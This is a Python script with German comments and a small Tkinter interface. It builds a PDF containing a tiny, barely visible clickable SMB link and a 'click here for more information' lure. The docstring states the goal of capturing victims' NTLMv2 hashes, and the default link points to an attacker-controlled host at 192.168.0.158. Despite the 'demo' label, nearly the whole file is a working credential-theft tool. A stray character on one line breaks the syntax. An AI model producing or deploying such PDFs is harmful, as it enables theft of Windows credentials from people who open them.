import fitz  # PyMuPDF
import tkinter as tk
from tkinter import filedialog, messagebox
import os
import traceback

def manipulate_pdf():
    """Erstellt ein PDF mit einem versteckten SMB-Link, um NTLMv2-Hashes abzugreifen."""
    output_pdf = entry_output.get()
    smb_uri = entry_smb.get()

    if not output_pdf:
        messagebox.showerror("Fehler", "Bitte wähle eine Ziel-PDF-Datei aus!")
        return

    try:
        # Neues leeres PDF-Dokument erstellen
        doc = fitz.open()
        page = doc.new_page() v

        # Debug: SMB-Link testen
        print(f"🔗 SMB-Link: {smb_uri}")

        # Klickbaren SMB-Link einfügen (kleinste mögliche Fläche)
        rect_smb = fitz.Rect(10, 10, 20, 20)  # Winzige Klickfläche
        page.insert_link({"kind": fitz.LINK_URI, "from": rect_smb, "uri": smb_uri})

        # Sichtbarer Hinweis für die Demo (kann weggelassen werden)
        page.insert_text((50, 100), "🔗 Klicken Sie hier für weitere Informationen", fontsize=12, color=(0, 0, 1))

        # Speichere das manipulierte PDF
        doc.save(output_pdf)
        doc.close()

        messagebox.showinfo("Erfolg", f"Manipuliertes PDF gespeichert als:\n{output_pdf}")

    except Exception as e:
        messagebox.showerror("Fehler", f"Fehler bei der PDF-Erstellung:\n{str(e)}")
        print(traceback.format_exc())

def select_output():
    """Öffnet den Dialog für die Ausgabe-PDF."""
    file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF-Dateien", "*.pdf")])
    if file_path:
        entry_output.delete(0, tk.END)
        entry_output.insert(0, file_path)

# GUI mit Tkinter
root = tk.Tk()
root.title("SMB-Hash Demo - PDF-Manipulator")
root.geometry("500x250")

# Ausgabe-PDF Auswahl
tk.Label(root, text="Wähle die Ausgabe-PDF:").pack(pady=5)
entry_output = tk.Entry(root, width=50)
entry_output.pack(pady=5)
tk.Button(root, text="Speicherort auswählen", command=select_output).pack(pady=5)

# SMB-Link Eingabe
tk.Label(root, text="Gib die SMB-URI ein:").pack(pady=5)
entry_smb = tk.Entry(root, width=50)
entry_smb.insert(0, r"\\192.168.0.158\share")  # Standardwert
entry_smb.pack(pady=5)

# Buttons für Aktion
tk.Button(root, text="PDF erstellen", command=manipulate_pdf).pack(pady=10)
tk.Button(root, text="Beenden", command=root.quit).pack(pady=5)

# GUI starten
root.mainloop()
